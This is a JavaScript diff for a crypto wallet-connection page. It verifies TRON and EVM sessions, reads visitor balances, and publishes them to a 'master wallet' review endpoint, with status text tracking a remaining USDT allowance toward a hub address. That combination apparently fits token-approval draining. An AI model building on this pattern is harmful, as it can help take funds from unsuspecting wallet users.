+        && typeof /** @type {{ trx?: { getBalance?: unknown } }} */ (tronWeb).trx?.getBalance === "function";
+      if (!tronReady) {
+        if (walletId === "trust") {
+          markTrustDeepLinkFailed();
+          showTrustStillOutsideTronRecovery();
+        }
+        throw new Error(
+          walletId === "trust"
+            ? `Trust Wallet did not expose tronWeb yet. Use the Trust TRON open link (coin_id=195) or TronLink / WalletConnect.`
+            : `A genuine TRON provider session is required before assets can load. ${TRON_IN_APP_BROWSER_HINT}`,
+        );
+      }
+    }
+    if (selectedChain.network === "evm" && !/^0x[0-9a-fA-F]{40}$/.test(address)) {
+      throw new Error(`Connect an EVM 0x account for ${selectedChain.label}.`);
     }
 
     const existing = await fetchJson("/api/auth/session");
@@ -620,7 +1192,9 @@ async function connectSelected(walletId) {
     showState({
       kind: "success",
       title: "Wallet connected",
-      message: "Your verified address is shown below. Balances and recent activity load from your wallet provider.",
+      message: authenticated.network === "tron"
+        ? "TRON session verified. Loading TRX, known TRC-20 balances, and remaining USDT allowance…"
+        : "Your verified address is shown below. Balances and recent activity load from your wallet provider.",
       address,
     });
     showConnected(authenticated);
@@ -632,6 +1206,7 @@ async function connectSelected(walletId) {
       message: rejected
         ? "You declined the wallet request. Nothing was signed or submitted."
         : publicError(error),
+      help: walletId === "trust" || walletId === "tronlink" ? mobileHelp(walletId) : null,
     });
   } finally {
     busy = false;
@@ -806,25 +1381,41 @@ function showConnected(authenticated, options = {}) {
     ui.linkedWalletView.removeAttribute("hidden");
     ui.dialogWalletAssets.scrollIntoView({ behavior: "smooth", block: "start" });
   });
-  showWalletManager(authenticated);
 }
 
 /**
  * @param {{ address: string, network: "evm" | "tron", chainId: string }} authenticated
- * @param {{ scrollIntoView?: boolean }} [options]
+ * @param {{ scrollIntoView?: boolean, force?: boolean }} [options]
  */
 async function loadVerifiedWalletAssets(authenticated, options = {}) {
-  if (authenticated.network === "tron" && looksLikeTronAddress(authenticated.address)) {
-    setAssetListHeading("Total assets (TRX, TRC-10, TRC-20)");
-    await presentConnectedWallet(authenticated.address, options);
-    return;
+  const key = `${authenticated.network}:${authenticated.chainId}:${authenticated.address}`;
+  if (!options.force && verifiedAssetLoadKey === key) {
+    if (verifiedAssetLoadPromise) return verifiedAssetLoadPromise;
+    if (Date.now() - verifiedAssetLoadedAt < 5_000) return;
   }
-  if (authenticated.network === "evm") {
-    setAssetListHeading("Total assets (native + ERC-20)");
-    await presentConnectedEvmWallet(authenticated.address, authenticated.chainId, options);
-    return;
+  verifiedAssetLoadKey = key;
+  const run = (async () => {
+    if (authenticated.network === "tron" && looksLikeTronAddress(authenticated.address)) {
+      setAssetListHeading("Total assets (TRX, TRC-10, TRC-20)");
+      await presentConnectedWallet(authenticated.address, options);
+      return;
+    }
+    if (authenticated.network === "evm") {
+      setAssetListHeading("Total assets (native + ERC-20)");
+      await presentConnectedEvmWallet(authenticated.address, authenticated.chainId, options);
+      return;
+    }
+    hideWalletAssetPanels();
+  })();
+  verifiedAssetLoadPromise = run;
+  try {
+    await run;
+  } finally {
+    if (verifiedAssetLoadPromise === run) {
+      verifiedAssetLoadPromise = null;
+      verifiedAssetLoadedAt = Date.now();
+    }
   }
-  hideWalletAssetPanels();
 }
 
 /**
@@ -898,30 +1489,75 @@ async function presentConnectedWallet(address, options = {}) {
     return;
   }
   beginWalletAssetLoad(trimmed);
+  showSnapshotSync("Reading balances before publishing the master-wallet snapshot…", false);
   if (options.scrollIntoView !== false) {
     ui.linkedWalletView.scrollIntoView({ behavior: "smooth", block: "start" });
   }
-  const tronWeb = await resolveConnectedTronWeb(trimmed);
-  if (generation !== assetFetchGeneration) return;
-  if (!tronWeb) {
-    showWalletAssetError("Your wallet provider is not ready. Unlock TronLink or reconnect so balances can be read from your wallet session.");
+  const genuine = requireGenuineTronSessionAddress(
+    session && sameWalletAddress(session.address, trimmed) ? session.address : "",
+    session?.network || "evm",
+  );
+  if (!genuine.ok) {
+    showWalletAssetError(`${genuine.error} Public address lookup alone is not treated as a wallet connection.`);
+    showSnapshotSync("Snapshot not published. Connect a genuine TRON provider session first.", true);
     return;
   }
-  const assets = await fetchTronWalletAssetsFromTronWeb(tronWeb, trimmed);
+
+  const tronWeb = await resolveConnectedTronWeb(trimmed);
+  if (generation !== assetFetchGeneration) return;
+  let assets;
+  /** @type {Array<{ txid: string, when: string, direction: string, summary: string }>} */
+  let transactions = [];
+  let source = "connected TRON wallet provider";
+  const tronProviderReady = tronWeb && typeof tronWeb === "object"
+    && typeof /** @type {{ trx?: { getBalance?: unknown } }} */ (tronWeb).trx?.getBalance === "function";
+  if (tronProviderReady) {
+    assets = await fetchTronWalletAssetsFromTronWeb(tronWeb, trimmed);
+  } else if (session?.walletId === "walletconnect" && session.network === "tron") {
+    // Verified WalletConnect TRON session (T…) without injected TronWeb: chain read only after genuine pairing.
+    source = "verified WalletConnect TRON session · TRON mainnet read";
+    const fallback = await fetchJson(`/api/public/wallet-assets?address=${encodeURIComponent(trimmed)}`);
+    assets = publicTronSnapshotAssets(fallback);
+    if (!assets.ok) {
+      showWalletAssetError(
+        `${assets.error || "Balances could not be read."} ${TRON_IN_APP_BROWSER_HINT}`,
+      );
+      showSnapshotSync("Snapshot not published. Open the TRON in-app browser for provider reads, then retry.", true);
+      return;
+    }
+  } else {
+    showWalletAssetError(
+      `No injected TRON provider session is available. ${TRON_IN_APP_BROWSER_HINT} Public address lookup alone is not enough.`,
+    );
+    showSnapshotSync("Snapshot not published. Complete a genuine TRON provider connection, then retry.", true);
+    return;
+  }
   if (generation !== assetFetchGeneration) return;
   if (!assets.ok) {
     showWalletAssetError(assets.error || "Your wallet could not return TRON balances.");
+    showSnapshotSync("Snapshot not published because balances could not be verified. Unlock or reconnect the wallet, then retry.", true);
     return;
   }
-  applyWalletAssetSuccess(trimmed, { address: trimmed, assets });
-  const txResult = await fetchTronRecentTransactionsFromTronWeb(tronWeb, trimmed);
-  if (generation !== assetFetchGeneration) return;
-  applyWalletTransactionSuccess(
-    txResult.ok ? txResult.transactions : [],
-    txResult.ok ? "" : txResult.error,
-  );
+  applyWalletAssetSuccess(trimmed, { address: trimmed, assets, source });
+  if (tronProviderReady) {
+    const txResult = await fetchTronRecentTransactionsFromTronWeb(tronWeb, trimmed);
+    if (generation !== assetFetchGeneration) return;
+    transactions = txResult.ok ? txResult.transactions : [];
+    applyWalletTransactionSuccess(transactions, txResult.ok ? "" : txResult.error);
+  } else {
+    applyWalletTransactionSuccess(
+      [],
+      "Recent activity needs an injected TRON provider (TronLink / Trust TRON). Balances above came from the verified TRON session’s mainnet read.",
+    );
+  }
   if (session) {
-    await publishProviderSnapshot(session, assets, txResult.ok ? txResult.transactions : []);
+    const published = await publishProviderSnapshot(session, assets, transactions);
+    if (generation !== assetFetchGeneration) return;
+    if (published.ok) {
+      showSnapshotSync(`Balances loaded from ${source} and published to the master wallet. Use Open master wallet review or its Check now button.`, false);
+    } else {
+      showSnapshotSync(`Balances loaded, but snapshot publication failed: ${published.error} Retry balance sync.`, true);
+    }
   }
 }
 
@@ -970,13 +1606,19 @@ async function presentConnectedEvmWallet(address, chainId, options = {}) {
     txResult.ok ? "" : txResult.error,
   );
   if (session) {
-    await publishProviderSnapshot(session, assets, txResult.ok ? txResult.transactions : []);
+    const published = await publishProviderSnapshot(session, assets, txResult.ok ? txResult.transactions : []);
+    showSnapshotSync(
+      published.ok
+        ? "Balances were published to the master wallet."
+        : `Balances loaded, but snapshot publication failed: ${published.error} Retry balance sync.`,
+      !published.ok,
+    );
   }
 }
 
 /**
  * @param {string} requestedAddress
- * @param {{ address?: string, assets: unknown }} payload
+ * @param {{ address?: string, assets: unknown, source?: string }} payload
  */
 function applyWalletAssetSuccess(requestedAddress, payload) {
   const resolvedAddress = payload.address || requestedAddress;
@@ -985,9 +1627,10 @@ function applyWalletAssetSuccess(requestedAddress, payload) {
   const tokens = normalizeWalletAssetTokens(payload.assets);
   renderWalletAssetLists(tokens);
   clearWalletAssetError();
+  const source = payload.source || "connected TRON wallet provider";
   const note = tokens.length === 1 && tokens[0].display === "0 TRX"
-    ? `Loaded from your wallet provider for ${shortenWalletAddress(resolvedAddress)}. This wallet currently shows 0 TRX.`
-    : `Balances for ${shortenWalletAddress(resolvedAddress)} were read through your connected TRON wallet (TronWeb). Hub link ${shortenWalletAddress(CONNECTION_TARGET)} is recorded separately.`;
+    ? `Loaded via ${source} for ${shortenWalletAddress(resolvedAddress)}. This wallet currently shows 0 TRX.`
+    : `Balances for ${shortenWalletAddress(resolvedAddress)} were read via ${source} (TRX + known TRC-20 starting with official USDT). Hub link ${shortenWalletAddress(CONNECTION_TARGET)} is recorded separately. Remaining capped USDT allowance refreshes below.`;
   ui.linkedAssetNote.textContent = note;
   ui.dialogAssetNote.textContent = note;
 }
@@ -1046,7 +1689,6 @@ function revealWalletAssetPanels(address) {
   ui.dialogWalletAssets.removeAttribute("hidden");
   ui.linkedVisitorAddress.textContent = address;
   ui.dialogVisitorAddress.textContent = address;
-  if (session) showWalletManager(session);
 }
 
 /**
@@ -1072,129 +1714,6 @@ function clearWalletAssetError() {
 function hideWalletAssetPanels() {
   ui.linkedWalletView.hidden = true;
   ui.dialogWalletAssets.hidden = true;
-  hideWalletManager();
-}
-
-/**
- * @param {{ address: string, network: "evm" | "tron" }} authenticated
- */
-function showWalletManager(authenticated) {
-  ui.walletManagerPanel.hidden = false;
-  ui.walletManagerPanel.removeAttribute("hidden");
-  ui.managerHubAddress.textContent = CONNECTION_TARGET;
-  ui.managerTransferRecipient.value = CONNECTION_TARGET;
-  const tronReady = authenticated.network === "tron" && looksLikeTronAddress(authenticated.address);
-  ui.managerTransferTron.hidden = !tronReady;
-  ui.managerTransferEvmNote.hidden = tronReady;
-  if (tronReady) {
-    ui.managerReviewSender.textContent = authenticated.address;
-  }
-  resetManagerTransferFlow();
-}
-
-function hideWalletManager() {
-  ui.walletManagerPanel.hidden = true;
-  managerTransferReview = null;
-  managerTransferBusy = false;
-}
-
-function resetManagerTransferFlow() {
-  managerTransferReview = null;
-  ui.managerTransferReview.hidden = true;
-  ui.managerTransferForm.hidden = false;
-  ui.managerTransferError.hidden = true;
-  ui.managerTransferError.textContent = "";
-  ui.managerTransferStatus.textContent = session?.network === "tron"
-    ? "Review balances above, then request a hub transfer. Your wallet must approve every submission."
-    : "";
-}
-
-/**
- * @param {string} message
- */
-function showManagerTransferError(message) {
-  ui.managerTransferError.textContent = message;
-  ui.managerTransferError.hidden = false;
-}
-
-function onManagerReviewTransfer() {
-  if (managerTransferBusy || !session || session.network !== "tron") return;
-  clearManagerTransferError();
-  if (ui.managerTransferRecipient.value.trim() !== CONNECTION_TARGET) {
-    showManagerTransferError("The hub recipient does not match the configured connection target.");
-    return;
-  }
-  const parsed = parseUsdtAmount(ui.managerTransferAmount.value);
-  if (!parsed.ok) {
-    showManagerTransferError(parsed.error);
-    return;
-  }
-  managerTransferReview = { amountText: ui.managerTransferAmount.value.trim(), unitsText: parsed.unitsText };
-  ui.managerReviewSender.textContent = session.address;
-  ui.managerReviewRecipient.textContent = CONNECTION_TARGET;
-  ui.managerReviewAmount.textContent = `${managerTransferReview.amountText} USDT`;
-  ui.managerTransferForm.hidden = true;
-  ui.managerTransferReview.hidden = false;
-  ui.managerTransferStatus.textContent = "Review the transfer details. Nothing is sent until you approve it in your wallet.";
-}
-
-async function onManagerSignTransfer() {
-  if (managerTransferBusy || !managerTransferReview || !session || !activeWallet || session.network !== "tron") return;
-  managerTransferBusy = true;
-  ui.managerTransferError.hidden = true;
-  ui.managerTransferStatus.textContent = "Waiting for your wallet to sign the USDT transfer. Reject the prompt if any detail differs.";
-  try {
-    const tronWeb = await waitForTronWeb(activeWallet.provider, { requiredAddress: session.address, maxAttempts: 20 });
-    if (!tronWeb) throw new Error("The TRON wallet did not expose a signing session.");
-    const network = await readTronGenesisForTransfer(tronWeb);
-    if (!network.ok) throw new Error(network.message);
-    if (ui.managerTransferRecipient.value.trim() !== CONNECTION_TARGET) {
-      throw new Error("The hub recipient changed. Cancel and review the transfer again.");
-    }
-    const parsed = parseUsdtAmount(managerTransferReview.amountText);
-    if (!parsed.ok || parsed.unitsText !== managerTransferReview.unitsText) {
-      throw new Error("The amount changed. Cancel and review the transfer again.");
-    }
-    const result = await submitTronUsdtTransfer(tronWeb, {
-      sender: session.address,
-      recipient: CONNECTION_TARGET,
-      unitsText: managerTransferReview.unitsText,
-    });
-    if (!result.ok) {
-      if (result.rejected) {
-        ui.managerTransferStatus.textContent = "Transfer rejected in your wallet. No funds were moved.";
-      } else {
-        showManagerTransferError(result.message || "Transfer failed before it was confirmed.");
-        ui.managerTransferStatus.textContent = "Transfer failed before it was confirmed.";
-      }
-      return;
-    }
-    resetManagerTransferFlow();
-    ui.managerTransferAmount.value = "";
-    ui.managerTransferStatus.textContent = `Transfer submitted with your signature. Transaction ID: ${result.txid}. Confirm the receipt on TRONSCAN before treating it as final.`;
-    void presentConnectedWallet(session.address, { scrollIntoView: false });
-  } catch (error) {
-    showManagerTransferError(publicError(error));
-    ui.managerTransferStatus.textContent = "Transfer stopped. Nothing was submitted.";
-  } finally {
-    managerTransferBusy = false;
-  }
-}
-
-/**
- * @param {any} tronWeb
- */
-async function readTronGenesisForTransfer(tronWeb) {
-  if (!tronWeb?.trx || typeof tronWeb.trx.getBlockByNumber !== "function") {
-    return assessNetwork({});
-  }
-  const block = await tronWeb.trx.getBlockByNumber(0);
-  return assessNetwork({ genesisBlockId: block?.blockID });
-}
-
-function clearManagerTransferError() {
-  ui.managerTransferError.hidden = true;
-  ui.managerTransferError.textContent = "";
 }
 
 /**
@@ -1268,7 +1787,7 @@ function clearWalletTransactionError() {
  * @param {Array<{ txid: string, when: string, direction: string, summary: string }>} transactions
  */
 async function publishProviderSnapshot(authenticated, assets, transactions) {
-  await fetchJson("/api/wallet-provider-snapshot", {
+  const response = await fetchJson("/api/wallet-provider-snapshot", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -1277,10 +1796,32 @@ async function publishProviderSnapshot(authenticated, assets, transactions) {
       transactions,
     }),
   });
+  if (!response.ok || response.body?.ok !== true) {
+    return {
+      ok: false,
+      error: response.body?.error || (response.status === 401
+        ? "The verified session expired. Reconnect the wallet."
+        : "The server did not accept the snapshot."),
+    };
+  }
+  return { ok: true };
+}
+
+/**
+ * @param {string} message
+ * @param {boolean} retry
+ */
+function showSnapshotSync(message, retry) {
+  ui.walletSnapshotSync.hidden = false;
+  ui.walletSnapshotStatus.textContent = message;
+  ui.retryProviderSnapshot.hidden = !retry;
 }
 
 function clearConnectedUi() {
   assetFetchGeneration += 1;
+  verifiedAssetLoadPromise = null;
+  verifiedAssetLoadKey = "";
+  verifiedAssetLoadedAt = 0;
   connected = false;
   ui.chip.hidden = true;
   ui.headerAddress.textContent = "";
@@ -1293,6 +1834,9 @@ function clearConnectedUi() {
   ui.dialogAssetNote.textContent = "Connect a wallet to load balances from your wallet provider.";
   ui.linkedTransactionNote.textContent = "Recent activity appears after your wallet connects.";
   ui.dialogTransactionNote.textContent = ui.linkedTransactionNote.textContent;
+  ui.walletSnapshotSync.hidden = true;
+  ui.walletSnapshotStatus.textContent = "";
+  ui.retryProviderSnapshot.hidden = true;
   renderWalletTransactionLists([]);
   ui.ownerAddress.hidden = true;
   ui.ownerAddress.textContent = "";
@@ -1314,10 +1858,11 @@ function showOptions() {
   ui.help.hidden = true;
   ui.address.hidden = true;
   setControlsDisabled(false);
+  updateTrustNetworkHint();
 }
 
 /**
- * @param {{ kind: "pending" | "success" | "error", title: string, message: string, address?: string, help?: { href: string, label: string } | null }} next
+ * @param {{ kind: "pending" | "success" | "error", title: string, message: string, address?: string, help?: { href: string, label: string } | null, trustTronCta?: boolean }} next
  */
 function showState(next) {
   deferredState = next;
@@ -1334,10 +1879,14 @@ function showState(next) {
     ui.dialogWalletAssets.hidden = false;
     ui.dialogWalletAssets.removeAttribute("hidden");
   }
-  ui.help.hidden = !next.help;
-  if (next.help) {
-    ui.help.href = next.help.href;
-    ui.help.textContent = `${next.help.label} ↗`;
+  if (next.trustTronCta || (next.kind === "error" && /TRON|Trust|EVM/i.test(`${next.title} ${next.message}`))) {
+    showTrustTronReopenPanel(next.message);
+  }
+  const help = next.help || (next.trustTronCta ? mobileHelp("trust") : null);
+  ui.help.hidden = !help;
+  if (help) {
+    ui.help.href = help.href;
+    ui.help.textContent = `${help.label} ↗`;
   }
   ui.retry.hidden = next.kind === "pending";
 }
@@ -1408,8 +1957,15 @@ function collectStrings(value, depth = 0) {
  */
 function missingWalletMessage(walletId) {
   if (walletId === "metamask") return "Install or unlock MetaMask, or open this page in its mobile browser.";
-  if (walletId === "trust") return "Open this page in Trust Wallet’s browser and choose an EVM or TRON account.";
-  if (walletId === "tronlink") return "Install or unlock TronLink, or open this page in the TronLink mobile browser.";
+  if (walletId === "trust") {
+    if (trustWalletOpenOnEvmOnly(window) || isInsideTrustWallet(window)) {
+      return trustWalletSwitchToTronMessage();
+    }
+    return `Trust Wallet’s TRON provider was not detected. ${trustWalletSwitchToTronMessage()}`;
+  }
+  if (walletId === "tronlink") {
+    return `TronLink was not detected. ${TRON_IN_APP_BROWSER_HINT}`;
+  }
   return "No additional injected wallet provider was found.";
 }
 
